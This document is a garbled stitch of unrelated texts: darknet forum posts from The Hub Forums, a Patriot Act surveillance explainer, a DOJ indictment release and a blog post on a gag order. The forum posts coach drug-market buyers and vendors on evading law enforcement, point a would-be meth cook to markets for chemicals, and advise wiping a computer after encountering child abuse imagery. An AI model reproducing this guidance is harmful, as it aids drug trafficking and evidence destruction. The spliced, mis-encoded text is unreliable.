storage facilities. Harley Geiger of the Center for Democracy and Technology has pointed out that under a June 1 sunset, FISA would simply revert to this provision.Â·      An ECPA âD Orderâ: Under Section 2703(d) of the Electronic Communications Privacy Act (ECPA), the government can get a court order for information from ISPs or other communications providers about their customers, including the sorts of metadata the government gets with Section 215. To get a D Order, the government must provide âspecific and articulable facts showing that there are reasonable grounds to believe that . . .  the records or other information sought, are relevant and material to an ongoing criminal investigation.â  Â·      Grand Jury Subpoenas: Given that Section 215 explicitly says that the FISA Court (FISC) âmay only require the production of a tangible thing if such thing can be obtainedâ with a grand jury subpoena, itâs apparent that a grand jury subpoena is a reasonable substitute, at least where a grand jury can be convened.Â·      National Security Letters (NSLs): Similar to subpoenas, NSLs allow intelligence agencies to collect records from a range of entities including telecommunications providers, financial institutions, credit reporting bureaus, travel agencies and others. Nearly all NSLs include self-certified gag orders, which EFF has successfully challenged as unconstitutional. Nevertheless, the FBI and other agencies can use NSLs to collect much the same information as Section 215, although the government has also misused NSLs to obtain communication records not authorized by the NSL statute.Â·      Administrative Subpoenas: Many federal agencies have the authority to issue subpoenas for customer records in their normal course of business. These authorities are extremely widespread, comprising 335 different statutes by one count.  Â·      FISA Warrants: Under FISA, the government can get warrants from the FISC for electronic surveillance and physical searches in the context of national security investigations. Although these require a higher showingâprobable causeâstatistics compiled by EPIC show the FISC routinely issues them, and has done so since FISA was passed in 1978.Some of these laws involve different legal standards than Section 215, and not all of them apply in all contexts, although exactly how the government thinks it can use many of them remains unclear. Moreover, mapping these to the governmentâs actual use of 215 is imprecise because the government also continues to say that the types of information it obtains with Section 215 are classified. FBI Director James Comey claims the loss of Section 215 would be a âproblemâ because at least some of this information canât be obtained with a subpoena or an NSL but hasn't given any examples. And taken together the governmentâs tools are formidable, making it difficult to see legitimate, targeted national security information that the government cannot get even without the current version of Section 215, a conclusion confirmed by the Inspector General report that as of 2009 it could not âidentify any major case developments from the records obtained in response to Section 215 orders.""Finally, looking beyond Section 215, two other powers would also expire with the Patriot Act sunset. First is the so-called lone wolf provision that the government has never used. Not once.  The second is the âroving wiretapsâ provision that had been used only 11 times as of 2013 and for which the government has issued no stories of its actual usefulness in a terrorism investigation. Meanwhile, EFF unearthed evidence that this provision had been misused back in 2011. So it seems thereâs little there too. In short, donât believe the hype that the government will have its hands tied behind its back without Section 215."

"The Hub Forums","Zaphod","8450.0","2015-04-20T21:24:41","Fresh into the Deepweb","Start Here/For Beginners"," Final month of highschool, eh? That probably means that you are underage.     FWIW, no one uses ""anons"" or even worse, ""annonettes"" -- using such terms will make most people laugh, wince, or write you off as a clueless git.    All this is bullshit... it's just pointless semantics.    What is CF? Perhaps you mean child pornography? Child pornography (sometimes referred to by the acronym CP) is, without a doubt, one of the nastiest things to be found on the net. Part of the problem is that, once an image appears on your screen, there is likely a thumbnail or other record of it on your hard drive, your swapfile, etc. Even a couple of thumbnail images are enough to get you arrested and, if  that happens, you might as well slit your throat. If you get arrested on suspicion of a child pornography offense, there is no such thing as ""innocent until proven guilty"" -- rather, in the eyes of the police, jail guards, and even other prisoners, you are guilty until you prove yourself innocent. Proving your innocence is no easy matter, because the laws have been changed in such a way as to handcuff the defense.   In most criminal cases, you have the right to examine (and challenge) the evidence used by the prosecution against you -- this is NOT the case if you are charged with a child pornography offense. If you were charged with a hacking offense, the prosecution would be obligated to provide your lawyer with a copy of your hard drive, so you could examine the evidence -- in CP cases, the law  forbids the prosecution from handing over a copy of the drive. Good luck challenging the evidence without a copy of the drive...    If, God help you, you go to trial, especially a jury trial, you're dead. All the prosecution has to do is to show a few images on a screen, where they can be seen by the jury, and it's over. The jurors will become enraged, and decide that  someone has to pay, that that someone will be the one in the dock, i.e. you.   Even if, by some miracle, the courts exonerate you, the stigma never goes away -- the suspicion never goes away. The vast majority of the population will still believe you are guilty, and that you ""merely got away with it somehow"".    There is almost always a crackdown of one sort or another going on. About 2 years ago FreedomHosting was busted for hosting CP sites. All the other sites that were hosted there were taken down as well. Operation Onymous seemed to be largely aimed at marketplace sites concerned with drugs/guns/fraud, etc.   The best way to protect yourself is to use Tails, so nothing gets written to your hard drive -- if you're using a Windows box, and you have encountered any CP, you'll need to wipe the machine using DBAN. There is no other sure way of getting rid of all the traces on the computer.

If a vendor looks after me, I make sure I do all I can to return the favour. It works both ways so doing the right thing by the vendor and finalizing the order once you are happy with everything will only work in your favour. Pissing them off by taking an eternity to finalize your order will not help your cause if you get the chance to order from them again (using the same account of course).  ","I always inspect my merchandise after I get it, then I quickly finalize after. Honestly, I tend to be a faster buyer than the vendor is a seller. So if a deal goes slowly with me, it's usually on the vendor's end. I only dispute if I find a defect in my product and the vendors usually help fix those issues. After the fixes, I then finalize and leave feedback. Never FE unless you have a good history with the vendor and you are familiar with each other. And never deal with a vendor off-site, away from any escrow. There's always exceptions, but chances are that you will get scammed."

Ideal for the artist and everyday user, the Mac OS is a personal favourite. The fact that it's unix based makes it quite similar to linux with very similar terminal commands. The only downside to Mac OS is the small range of games and the high price of the Macintosh computer required to run Mac OS X+84Unfair to classify OSX as a single stand-alone OS and compare it to Windows as a long list of very different systems from 3.1 to whatever they're doing this week. OSX is a variant of Unix based on FreeBSD which is in turn based on BSD that predates MSDOS by a decade (~) by my recollection. Microsoft should join the rest of the world and help create a unified OS core such that each variant merely offers their own ""flavoured"" shell. Windows was nothing but a menu system for MSDOS. A Unified system would solve many of the problems of writing code for all computers to use.+2Em, with respect, the person who wrote the paragraph staring ""Yea the whole reason why macs never get viruses... ' knows nothing at all about Macs. As someone who has been using them for over 25 years (alongside Windows and Linux) I DO! So, you can only do ""graphic arts, music, design and so forth...""? Actually these days you can do whatever you want on a Mac and in a far simpler, more logical way than you can in Windows. And faster. This person is living in the past and has obviously not used a Mac recently. You CAN play games on them brilliantly! Or perhaps I am imagining that?As for users having to ""run to the Apple Store because they don't know squat on how to resolve the issue"", that's totally inaccurate as well.

Martinez; U.S. Postal Inspection Service, Inspector in Charge Rafael E. Nunez; U.S. Food and Drug Administration Office of Criminal Investigations, Special Agent In Charge Lisa Malinowski; and U.S. Immigration and Customs Enforcementâs (ICE) Homeland Security Investigations (HSI) Acting special Agent in Charge Tatum King.View a list of the Defendants and the charges: http://www.justice.gov/dea/divisions/sf/2014/sf053014.pdfAccording to the Indictment, Donagal, a/k/a âXanax King,â of Martinez, Calif., is alleged to have manufactured, distributed, and possessed with intent to distribute counterfeit alprazolam (Xanax) pills and other drugs. The Xanax pills at issue were manufactured to resemble alprazolam pills made by Pfizer, Inc., including stamping the Pfizer âXanaxâ trademark on the pills. Donagal is also charged with two counts of international money laundering related to wire transfers of cash to China, both to promote the drug operation and to avoid the reporting requirements associated with such wires. Finally, Donagal is charged with structuring those wires in a way to avoid the $3,000 reporting requirement for such transactions, such as by arranging for multiple wires of below $3,000 to be sent to China from different Western Union locations in the Bay Area, all on the same day.Lindberg, Kirk, Gonzalez, Elliott, Tomada, and Neely are charged with aiding Donagal in that enterprise.Donagal, Lindberg, Mitts, Elliott, Tomada, and Neely were arrested yesterday in a joint law enforcement operation that took place in Martinez, Concord, Pleasant Hill, San Pablo, Pinole, Pacheco, Oakley, and Pittsburg, Calif. One additional defendant, Koskiniemi, was arrested in Fresno. Defendant Kirk is still at large, and Gonzalez is in state custody on another charge. The defendants in federal custody made their initial appearance in federal court in Oakland this morning, with the exception of Koskiniemi, who appeared in federal court in Fresno yesterday afternoon. Donagal, Lindberg, Mitts, Elliott, Tomada, and Neely were arraigned before the Honorable Donna M. Ryu, United States Magistrate Judge. Defendants Donagal, Lindberg, Elliott, Tomada, and Neely are currently in custody at North County Jail in Oakland, while Mitts was released on a bond in the amount of $50,000.Donagalâs next scheduled appearance is at 9:30 a.m. on June 5, 2014, for a detention hearing before the Honorable Kandis A. Westmore, United States Magistrate Judge. Mitts, Tomada, and Neely will appear before Judge Ryu tomorrow at 9:30 a.m. for identification of counsel. Elliott will appear before Judge Westmore on June 2, 2014, for identification of counsel, and Lindberg will appear before Judge Westmore on June 3, 2014, for a detention hearing.An Indictment merely alleges that crimes have been committed, and all defendants are presumed innocent until proven guilty beyond a reasonable doubt.  If convicted, the defendants face a maximum sentence of 20 years in prison and a fine of $1 million on the drug charges, 20 years in prison and a $500,000 fine for the money laundering charges, and 10 years in prison and a $500,000 fine on the structuring charges.  However, any sentence following conviction would be imposed by the court after consideration of the U.S. Sentencing Guidelines and the federal statute governing the imposition of a sentence, 18 U.S.C. Â§ 3553.Kevin Barry and Katie Medearis are the Assistant U.S. Attorneys who are prosecuting the case with the assistance of Assistant U.S. Attorney David Countryman of the Asset Forfeiture Unit. The prosecution is the result of an investigation by the DEA, assisted by IRS Criminal Investigations, the U.S. Postal Inspection Service, the U.S. Food and Drug Administration Office of Criminal Investigations, U.S. Customs and Border Protection, Homeland Security Investigations, the Concord Police Department, the Martinez Police Department, the Pittsburg Police Department, the Contra Costa County Sheriffâs Office, the South San Francisco Police Department, the Oakland Police Department, the Oakland School Police Department, the Livermore Police Department, the Walnut Creek Police Department, the San Ramon Police Department, and the Pleasant Hill Police Department.This case is the product of an extensive investigation by the Organized Crime Drug Enforcement Task Force, a focused multi-agency, multi-jurisdictional task force investigating and prosecuting the most significant drug trafficking organizations throughout the United States by leveraging the combined expertise of federal, state and local law enforcement agencies."

I knew that Sabu's setup was set to fail-open but for some reason I had misremembered that event as having been his Tor connection failing or disconnecting while in use, rather than not even using it at all (ouch). It does seem arrogant in a way... I would think that one would naturally be more cautious when connecting from one's home, or any other account actually tied to them.   I'm certainly no expert... From what I've read you're right about the traffic no longer being encrypted, but your IP is still obscured as it's the exit node's IP that shows.   In computer networking 127.0.0.1 is simply a reserved address that points back to itself (essentially). So if I load up a web browser and punch in that address (and assuming that I'm running a web server from the same box), it would just direct me to that web server on that same box, if that makes sense. Same on any computer and no internet connection required.  On onion services like a forum for example, regular clearnet forum software like SMF which would normally record user's IPs instead records itself, 127.0.0.1. That's due to the technicals of how Tor works and I'll leave that to someone far better at explaining things than I am. Essentially,  to a computer 127.0.0.1 universally means ""me"".  The reason some clearnet sites don't like Tor users (and why at least some of us love Cloudflare so much) is because they block Tor exit nodes, which are publicly listed. This is also why blockchain.info shows Tor users the message about their onion, but not non-Tor users.","...to pass through exit nodes. That is the point at which your traffic is no longer encrypted, and your IP is not obscured and can be logged.;My understanding is that exit nodes pass the IP as something like 127.0.0.1, which some Clearnet sites don't like."

Any OS, properly configured and monitored, can be safe.   The problem is with the ""properly configured and monitored"" part. Windows is a completely closed proprietary system. There is no way to know what sort of information gathering code is in there. Similarly, Apple uses proprietary hardware. In addition, the rate at which hackers find vulnerabilities in Windows programs should give you pause.  A lot of people like to parrot the problems with windows, etc. The only problem that I have with that is that most people that use Linux and tor don't read the source code and then compile their own binaries. If a hacker infects a binary of tor, or they clone Tor's site and have people download infected programs (or if the NSA does the same), what's the difference?  However, on the flip-side of that, there are a lot of smart people that DO read the code.

The way to get around that issue is to use the PGP detached signatures provided by the developers, along with their PGP keys. Most of the Tor Browser Bundle developers have used the same keys for a long time. The practices carried out by the Tails devs can be seen on their PGP key transition page: https://tails.boum.org/news/signing_key_transition/index.en.html Their older signing key has been used to sign their new key, so the trust I had in the old key effectively is transferred over to the new.

If you do vpn>tor, and something like the CIPAV as seen during 2013, happens, your tor IP isn't covering you, but your VPN is. Now, however, assuming the VPN is within reaching room of feds who want you, they can get the data, and your IP will be in the VPN's logs, assuming there almost undoubtedly are logs being collected. If you use tor, your IP is hidden from the VPN, and so if something like CIPAV happens, they know your VPN provider but they can't prove you've used the VPN at that time."
"The Hub Forums","canahontra","5706.0","2014-12-02T05:24:53","FrootVPN - new free Swedish VPN service","General Discussion/Security"," that last point was what brings me back to my original point. EU might only require ISPs to log data, but that means your connection time and from which IP, is saved by the ISP servicing the VPN.  They say that U.S. dissects any traffic leaving and/or entering the country, but in the end it is worth it. Tor is more likely to get you noticed, but it's not illegal, nor is using tor the equivalent of using a darkweb market, so while it might be something they could use to say ""this supports our other arguments,"" they can't use it as significant evidence. It would be inadmissable, at least in U.S. courts.  True on the exit vs entry, though. It's not OFTEN that it happens, but it CAN happen, was my point, in the least.  The thing with connecting to a VPN through tor, is that while in tor, they can't know that you're connecting to a foreign ISP, at least unless the node is foreign too.  My ISP doesn't care if I use Tor, and most don't. It was in the documents, but it wasn't a major part of the investigation, at least from a lawyer perspective.  Tor is generally looked down upon in countries like China, but since those are the kinds of countries where you would be suspicious by using it, they won't do anything to curb cybercrime, let alone shut down the darkweb markets, while the ones who would, don't really want tor to be de-anonymized, nor do they care if you use it, unless you're a target in an operation, or at least the starting point of an operation [not all operations start at the top, even though Blake did, because they had an idea, had an informant already on-the-scene, and simply built upon that].  Blocking nodes can lead to hidden services not working properly, on the client-end.  Torrentfreak is a good site, but I've never trusted VPN ""Reviews.""  The only one I can speak with absolute trust is DoubleVPN, but that's because I know people whom I trust, who've proven they keep no logs, and Russia doesn't require logs, and they're Russian, accept BTC and Perfectmoney, etc. They even provide a quadvpn, these create jumps to separate servers, as opposed to a single one. It's on trojanforge and also advertised on exploit[d0t]in.  True on the VPN IP with CIPAV, but it's still true, however, that without connecting to the vpn through tor, as opposed to vice versa, that when it phones the VPN IP to LE, and you're connecting directly to the VPN with your real IP, they have your IP. If you connect through tor TO the vpn, they know your VPN IP, but can't prove you were using it, not even by your personal ISP [putting the VPN's ISP out of the equation], should they crack protection, and it can be done.  Blocking some countries in the nodes [both exit and entry] can lead to some hidden services not working, so it takes some compromise, in order to work properly, and depending on which hidden services you wanna be able to visit, or the cost of not using the StrictNodes line under it.  DoubleVPN does a double jump, there's even a quadvpn provided by the company, and it's in Russia. I know some people on another forum who've identified wholly, that they don't keep logs, and if this were anyone who claimed to have ""identified"" a server keeping ""no logs,"" I wouldn't believe them, but I know them well enough. I think they also allow you to see inside the server to check for yourself, if I remember. I'd have to check the thread again. They accept perfectmoney and btc, even. It's also advertised on Russian forums.  DPI on networks is another issue, by the way, primarily on enterprise and college networks. Especially depending on what you're downloading.

The reason for that statement is that Tor exit nodes are notorious spots for governments to watch, and if they can read your clear/non-encrypted data flowing out from the exit node they can ""catch"" you.   The encryption between you and your VPN is not crap https a/k/a ssl using certs.  True, if your are using ssl from the VPN to the destination webserver perhaps, if they perform a MITM with a fake cert then they can see the traffic.  That doesn't mean they can link that traffic back to you UNLESS the data contains info that ID's you.   True.  That's if you're relying on certs, which you are not with traffic between you and your VPN.  That said, NEVER use PPTP encryption between you and your VPN as its easily hackable.  You must use Ipsec or OpenVPN protocols for effectively encrypted comms to/from your VPN.

"The Hub Forums","Angel Eyes","5706.0","2014-12-02T01:31:30","FrootVPN - new free Swedish VPN service","General Discussion/Security"," Actually, if you don't want your ISP to know you are using Tor, placing a VPN ahead of Tor makes perfect sense.  And remember that most of us use Tor to access hidden services, which means  neither the VPN or the tor exit node can see jack shit of who with and what you're communicating.   If 2048 encryption is easy to crack most of us are in serious danger.  You are massively overstating how easy it is to crack 2048 bit encryption.  It would take many years with massive computing power to crack a single 2048 bit private key.   If I log into a hidden service via VPN->Tor->hidden service, the ID I log in with cannot be linked back to me in any way.  Neither the VPN, nor any of the Tor relays can see the data I'm transmitting at all.  All the tor exit node can see is the onion address the data is transmitting to. Only the hidden service web server that decrypts the final destination packets can see that info.   I agree with you but https IS better than plaintext http.  That said, if anyone is relying on it to save then from prison they're a fool.     I was talking about the VPN's ISP, not mine.  Remember too that VPNs that operate in multiple countries use diff ISP's for each nation.  But on the subject we started on, the encrypted data sent from my machine to the VPN server I'm connected to is not easily decrypted at all.  And if that data, once decrypted at the VPN server, is being forwarded on to Tor then the only thing the VPN and hence its ISP can see at the point my packets flow out of the VPN server is encrypted data with a tor entry node IP address as the recipient.  Thus the VPN's ISP can't see anything of any real value other than that there is data flowing from the VPN's server to the tor network.  If the ISP perf'd traffic timing analysis they could probably see that I am forwarding info through the VPN and onto Tor, but that's all it could see, which is not of great help to the ISP or LE.    The whole Tor->VPN is better than VPN->Tor is a strange thing IMO because its a question of trusting the Tor exit node or trusting the VPN.  If either is compromised you can be fucked either way.  So until I get a better explanation I don't see the issue, and for our darknet purposes its all irrelevant because it doesn't apply to comms that never leave the Tor network as is the case with hidden services.","I've mentioned, in fact, several, numerous, countless times, on Evo, about how tor after VPN makes no sense. The VPN can see your IP, and the only way to fix that is by using tor to connect TO the VPN, not the other way around.;Angel Eyes, again, it's a relative science: how do you define ""Strong encryption?"" The most, MOST VPNs use, if anything over 1024 bit, is 2048. That's incredibly easy to crack. I've seldom encountered a VPN that uses 4096.;Containing data ID to you? What do you think you're doing when you connect to a VPN without an extra proxy between, and God forbid, log into, for instance, The Hub as your username?;Since when did I say using vpn is https alone? You've mentioned using plain-text authentication to sites as being risky, but that, to me, sounded as though you're implying https is any better, which is minimal in the practical world.;I presume you think I'm talking about YOUR ISP. I'm not. I'm talking about the ISP being used to service the VPN ITSELF. As in, not your local one, but the vpn server. As in, your virtual TAP adapter connects to a remote server set up to work as an openvpn tunnel, and that channels through THEIR [not your local ISP] ISP..the one that is servicing the VPN SERVICE/SERVER, NOT your local network connection which is simply connecting TO the VPN whose ISP I'M TALKING ABOUT."

After being tipped off by a tiny mouse that hears and sees all, we started looking around.

We reported all of these exits to the Tor Project and they are getting dropped from the consensus as we speak.  They simply used a huge pile of exit nodes and rewrite the onion address that we display on sigaint.org. This is likely targeting people using TAILS who don't write down our onion address or at least verify it from different sources.

The most popular markets currently are:-Blackbank-Agora-Nucleus-Pandora-Silk Road 3-AbraxasAgora is often down and has reach the maximum amount of users . Another site that offers chemicals is ""Green Road"". I forget the link to ""Green Road"" it's not a very popular market, I recall it being up and running in 2013. Some of these chemicals you can find at local hardware stores. Also, have you ever cooked meth before? If you are unexperienced when it comes to cooking meth you could get burnt and possibly inhale the chemicals from the meth, which is dangerous. Have you sold drugs on DNMs before? What markets will you sell them on?"

I remember reading a security paper that said something to the effect that 1/200 of RSA keys found in the wild are easily broken because they were generated in poor entropy conditions.  Other than that, the defaults in LUKS are strong enough. I may have changed the default cipher in mine to twofish-512-xts instead of AES-512-xts, but it's not necessary (Yes, i know that there is no such thing as AES or TWOFISH with 512 bit keysizes, but XTS mode requires double keysize).

"The Hub Forums","Claptrap","7495.0","2015-04-05T05:11:58","Thoughts on stronger FDE","General Discussion/Security"," Correct. They don't give you the option to modify the LUKS defaults when you're using the operating system installer. But you do have full control when you're just creating an encrypted file container or encrypting an external drive. I'd love it if OS vendors built in a feature to pass in those modified parameters, but frankly, we're probably just lucky (or LUKSy) that they even included LUKS in the installer in the first place :/  To clarify what Crow_of_Old  meant: The --iter-time 10000 will adjust the parameters of the key derivation algorithm in LUKS to take approx 10000 milliseconds. This makes it expecially hard to break the LUKS container by brute forcing passphrases. If you combine this with having a good passphrase to begin with (think diceware), then your LUKS containers will be quite secure. The passphrase is usually the weakest point of the system, but with --iter-time set to 10000 and depending on how good your passphrase is, then the master key may become the weak point. At that point, your biggest cause for concern will be an improperly seeded RNG.  Correct me if I'm wrong, but if you don't tell cryptsetup to --use-random, doesn't it use /dev/random by default unless you specifically tell it to --use-urandom? Again, I could totally be wrong about that.","when you run a linux installation the installer usually won't give you the option to pass those parameters I understand that with a livecd you can have your way to increase entropybut with a nonlive installation usually you cant enter anything besides what volume and size you want to useso to pass better parameters you have to do the encryption yourself using an already running systemunless the distro developers have taken care of that already by using modified parameters"

You're falling into this ""larger is better"" fallacy. What you need to understand is  why these keysizes were developed and/or chosen.   AES-256 was designed as a fail-safe, or fall-back, in the case that quantum computing became a reality. IIRC, quantum computers, due to their massive parallelism, would effectively reduce the key-size by one half. That means that 128-bit keys could be attacked as effectively as 64-bits keys on a classical computer. 256-bit keys would be reduced to an effective 128-bits, making it effectively impossible to break them.   I have read that the design of AES-256 suffers from some key-scheduling issues. Even despite that, either AES-128 or AES-256 are excellent choices -- the best attack known on either of these ciphers reduces the cipher strength by an effective 2 bits.   If Snowden's revelations have taught us anything, it is that crypto works -- if it didn't, the NSA and their allies wouldn't be investing so much time, money, and energy in trying to circumvent it.   Switching to SHA-512 for your hash is an excellent choice.

The Dark Web then is classified as a small portion of the Deep Web that has been intentionally hidden and is inaccessible through standard web browsers.  The most famous content that resides on the Dark Web is found in the TOR network. The TOR network is an anonymous network that can only be accessed with a special web browser, called the TOR browser.

First, if you already have an account that you've bought stuff with you should SERIOUSLY consider making a new account for selling stuff. The main reasons for this is, any orders you've made from your account in the past means that vendor may (or may not) still have your name and address from that sale. This means if you start selling a lot of stuff on here and that other vendor who has your address gets in trouble, they may pass your info along to LE for a reduced sentence or, the original seller could already be associate with LE i  the first place.  Either way its not very safe on your part to use a existing buying account for selling.  Your best bet is to register a new account with a username and password you've never used anywhere else!  Once you have your account you need to do some serious studying on the security basic's before setting up a vending account.",""

But 4 days is not late AT ALL. It wouldn't even enter my mind as an issue until it's been at least 7 days. it's SUPPOSED to take 2-4 days, but you should always automatically add 3 days to account for vendor inertia/sedation/laziness/stock problems. If it comes sooner than that, it's a pleasant surprise.  this bugs me: why isn't he using tracking?  and if he's not using tracking, how does he know it was lost or stolen? maybe it was ""undeliverable,"" which is a whole different thing and not a good sign for your address. if it's priority, it should be tracked to protect both of you. If he's shipping priority but not tracking it, that's bizarre and scammyish.  so far, i'm thoroughly unconvinced of his ""trustworthyness.""   btw if you want an easy test of your address, just order some trinket on ebay and see if it arrives on schedule.","I need help  I placed an order on agora from a trusted vendor last week.

If you use Torchat you may be interested in this.  https://github.com/special/torsion  Here's what the dev wrote on the tor-talk mailing list.    Torsion is a ready-to-use hidden service instant messaging client with bigger goals and better implementation than the previous work on this concept.  The goal [2] is to have a real solution for anonymous chat, with no servers to trust with your communication habits, that any reasonable person can use safely. I think this is a better way to meet those goals than the endless list of server-based encrypted messengers, including those that can integrate with Tor. The current version is a substantial improvement over (and not related to) TorChat, and I intend to quickly improve it from here to be more secure and more appealing to a broad audience.  Itâs usable now; there are packages [3] for Windows and OS X [4], a configuration wizard similar to TBB, contact requests, and a protocol I hopefully wonât regret. Iâm looking for people to try it out, validate my ideas and implementation, and help plan the future. Iâve met my first milestones; where to go from here is a decision Iâd like to make with the interested community.  If youâre intrigued, please give it a try and add torsion:rs7ce36jsj24ogfw. Iâm also responsive to email, github issues, and on OFTC as âspecialâ. Iâve documented the major points of the design at [2], but Iâm happy to answer questions and discuss. ",""

"The Hub Forums","Ava","52.100","2014-11-04T22:46:44","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners","I see there are quite a few relatively recent unanswered questions here.  I'll try to answer them all, from latest backwards.  ---should I use VPN or Tails?  They are totally different things, not interchangeable.  Tails is a full operating system that, out of the box, has no persistence, meaning there is no data stored between sessions.  This is useful to evade viruses and other trojans because even if you do manage to download one, it won't be there next time you reboot tails.  Tails also comes with most of the tools you need for the darknet, with Torbrowser and GPG/PGP installed and other useful tools.    A VPN can be used with Tails or with Torbrowser in your OS of choice.  But a VPN on its own does little to really keep you anonymous because most keep logs, even if they claim they don't (you just can't believe them because the consequences of misplaced trust are pretty huge).  Using a VPN before connecting to Tor, either with Tails or any OS, will hide the fact that you are using Tor from your ISP, which can be nice but is not any sort of requirement.  In my opinion, if you use Tails you are likely going to need to have some kind of persistence to store things locally, like a bitcoin wallet.  There are ways to do so with Tails, but the key is that whatever data you want to persist should be encrypted. The standard used nowadays is TrueCrypt, but be sure to use version 7.1a and not a later version.  There's a long story about this, but you can get an honest version here (***clearnet***):  https://www.grc.com/misc/truecrypt/truecrypt.htm.  TrueCrypt allows you to create an encrypted file that you can store other files inside of.  This way if you have a password document, bitcoin wallet or any other sensitive darknet info, they can all be stored fully strong-encrypted within a TC encrypted file.  ------------  ---As for Shredder on Windows, the problem really is your OS.  Windows is by far the least secure OS on the market.  If your machine is a windows machine I highly recommend using virtualization software like VirtualBox (free from Oracle) or Tails.  With VirtualBox you can run almost any OS inside your windows OS.  Very slick.  ------------  If anyone still needs help with GPGTools send me a PM and I'll be happy to assist.  ------------ Email  As for email accounts, any service works the same as any other except for two caveats:  1. you should find one that can work without javascript and must be accessible, and ALWAYS ACCESSED ONLY via Tor.  2. EVERY email you send/receive at these accounts must be PGP encrypted.  Safe-mail has a ""no-scripts"" option, yandex has a way to work without javascript, lelantos has squirrel mail, etc.  The ONLY benefit to onion-url email services is there is little chance for you to log on outside of Tor, which is an easy mistake to make if you're not careful.  Never trust any email provider, EVER.  You should always be distrustful, which is why you must always only log in via Tor and keep javascript turned off (its on by default in Torbrowser so make sure to shut it off when you download the latest TBB*).  ------------  Aside from the technologies discussed in this thread, and as others have mentioned, its also vital to keep your darknet and clearnet activities completely separate.  Its a good to use a different desktop, if your OS has this feature, for each set of apps.  For instance, your darknet desktop can have TrueCrypt, a bitcoin client and Torbrowser running, while your clearnet desktop has a regular browser running and whatever other apps you use in your non-black market life.  KEEP EVERYTHING SEPARATE.  Its even helpful to develop a darknet persona that writes a bit differently and to go into character when on the darknet.  This will help you to keep your lives separate.  If you log into facebook over Tor while also being logged into a marketplace or forum like the Hub, you are much more likely to mix your two lives together, so don't do that.    ------------ * The definitive way to shut off javascript in TBB/Firefox is to type about:config in the url window, click through the warning, use the search window that appears to look for the word ""javascript.enabled"", and then toggle that setting to ""false"" from its default true setting.",""

Unfortunately they busted him on an unrelated charge relating to child pornography and seized all his servers. Whether or not he was related to child porn or not, is unknown to me, or it could be a silly charge the feds slapped him with but either way, the feds ended up injecting malicious Javascript into his servers so that when users would visit certain sites, this malicious code would execute on their computers and reveal information about their computers to the feds. I suggest you read the following article to learn more about this.https://openwatch.net/i/200/       With that being said, you may want to disable Javascript in your browsers, especially when visiting certain websites like Silk Road that may become compromised one day. Many users refuse to visit the original Silk Road website and forums with Javascript enabled because the feds likely injected it with malicious Javascript to identify users.    In Tails, the browser is called Iceweasel and when Tor in ran in Windows, it uses Firefox. Both browsers can disable Javascript using the exact same method. Open up a Window and type the following command in the address bar, ""about:config"" and click the button that says ""I'll be careful, I promise.""    This will bring up a bunch of settings including a search bar at the top. Enter javascript in the search bar and look for the following two entries, ""javascript.enabled"" and ""browser.urlbar.filter.javascript"". Right click on these and click ""Toggle"" and you will see the Value changed to false. If you want to enable Javascript again, just click Toggle again and you will see the value change back to true.   Again, remember that every time you restart Tails you will have to do this again, so get into a habit of doing this every time. You never know when your favorite website could become compromised. "

","General Discussion/Security"," Here is a blog post you might find intersesting (and not a little disturbing):   DoJ's Gag Order On Reason Has Been Lifted â But The Real Story Is More Outrageous Than We Thought BY KEN WHITE Â· JUNE 22, 2015 Tags:#TeamWoodchipperCriminal JusticeFree Speech  http://popehat.com/2015/06/22/dojs-gag-order-on-reason-has-been-lifted-but-the-real-story-is-more-outrageous-than-we-thought/  Last Friday the folks at Reason confirmed what I suggested on Thursday â that the U.S. Attorney's Office for the Southern District of New York, after hitting Reason with a federal grand jury subpoena to unmask anonymous hyperbolic commenters, secured a gag order that prevented them from writing about it.  Nick Gillespie and Matt Welch describe how it all went down. Read it.  So, the truth is out â and it's more outrageous than you thought, even more outrageous than it appears at first glance.  What, you might ask, could be more outrageous than the United States Department of Justice issuing a questionable subpoena targeting speech protected by the First Amendment, and then abusing the courts to prohibit journalists from writing about it?  The answer lies in the everyday arrogance of unchecked power.  The Subpoena and the Gag Order: Rote Over Substance  Throughout this story some people have suggested that there may be hidden facts, unknown complications, that justify the government's conduct. Now that Reason's journalists can speak, we can see that there's no there there.  First, the subpoena. Some have argued that the Department of Justice must have had information spurring them to use the grand jury to pierce the anonymity of people engaged in protected political speech. Not so. As Reason's report shows, Assistant U.S. Attorney Niketh Velamoor never articulated any specific basis to fear the bluster of these commenters â any more than he did when I spoke to him.  Saturday I interviewed Mike Alissi, publisher of Reason, who confirmed that Velamoor never suggested that he had any basis to view these as true threats. In fact, he seemed uninterested in the distinction between protected speech and true threats, and refused to narrow the subpoena to carve out the patently non-threatening ""special place in hell"" commenter. There is no secret ticking time bomb, no wizard with a woodchipper, no classified justification.  This was the Department of Justice targeting speech because it could.  Next, the gag order. Reason has published the gag order. As I suspected, the government relied on Title 18, United States Code, section 2705 to justify it. That statute lets a judge issue a gag order prohibiting disclosure of a subpoena if the government proves the following dangers:  (1) endangering the life or physical safety of an individual; (2) flight from prosecution; (3) destruction of or tampering with evidence; (4) intimidation of potential witnesses; or (5) otherwise seriously jeopardizing an investigation or unduly delaying a trial.  Now look at the gag order:  Upon the application of the United States pursuant to 18 U.S.c. Â§ 2705(b):  1. The Court hereby determines that there is reason to believe that notification of the existence of the attached subpoena will result in one or more of the following consequences, namely, endangering the life or physical safety of an individual; flight from prosecution; destruction of or tampering with evidence; intimidation of potential witnesses; or otherwise seriously jeopardizing an investigation or unduly delaying a trial.  And with that, United States Magistrate Judge Frank Maas ordered that American journalists could not report on a government abuse of power for 180 days.  This was not a review by a neutral judicial officer; it was a rubber stamp, obediently regurgitating back the statutory factors without reflection or any finding of fact. The Magistrate took the government's word for it, because of course, the government never misleads federal judges.  Note the ""one or more of the following,"" showing that the finding is formulaic, not based on anything specific. Unduly delaying a trial? How could disclosing the subpoena possibly delay a trial when there are no charges, and never will be any charges because the comments being investigated are so clearly protected by the First Amendment? No. The statutory factors aren't all there because AUSA Velamoor presented actual particularized evidence of them and Judge Maas agreed based on evidence that they were present; they're there because they are in the statute and the government and the court, hand in hand, are just checking off boxes on a form. There is no hint that Judge Maas, let alone Velamoor, gave any consideration to the fact that the targets of the gag order were journalists, or that the underlying subpoena poses grave First Amendment concerns. Here, the theory that executive power will be checked by the court was a farce.  You can buy a rubber stamp for five bucks. Your tax dollars rent a Magistrate's rubber stamp at a hundred fifty thousand a year.  The government hasn't unsealed its application for a gag order. I hope that someone will use legal process to compel it to do so. Here's my prediction: when it comes to light, it will contain no more substantive information than appears on the face of the subpoena. That is, it will merely say ""these people said these things, we want their information, 